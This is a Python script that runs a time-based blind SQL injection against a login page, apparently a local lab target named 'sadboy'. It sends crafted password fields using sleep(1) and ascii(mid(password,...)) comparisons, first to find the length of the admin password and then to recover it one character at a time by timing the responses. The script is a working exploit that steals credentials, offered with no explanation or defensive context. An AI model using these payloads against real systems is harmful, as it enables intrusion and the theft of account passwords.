import requests as r
from string import printable
import time
 

proxy = {
    "http":"127.0.0.1:8080"
}

url = "http://localhost/sadboy/login.php"
length = 0
pwd = ''
header={
    "Content-Type": "application/x-www-form-urlencoded"
}

for i in range(1, 1000):
    payload=f"username=admin&password=-1'+or+length(password)+>=+{i}+and+username='admin'+and+sleep(1)--+-&submit="
    res = r.post(url, data=payload, headers=header)
    print(res.elapsed.total_seconds())
    if res.elapsed.total_seconds() < 1:
        length = i
        print("length password:",i)
        break
 
for i in range(1, length):
    for char in printable.replace("%", ""):
        payload = f"username=admin&password=-1'+or+username='admin'+and+ascii(mid(password,{i},1))+=+{ord(char)}+and+sleep(1)--+-&submit="
        res = r.post(url, data=payload, headers=header)
        if res.elapsed.total_seconds() > 1:
            pwd += char
            print(pwd)
            break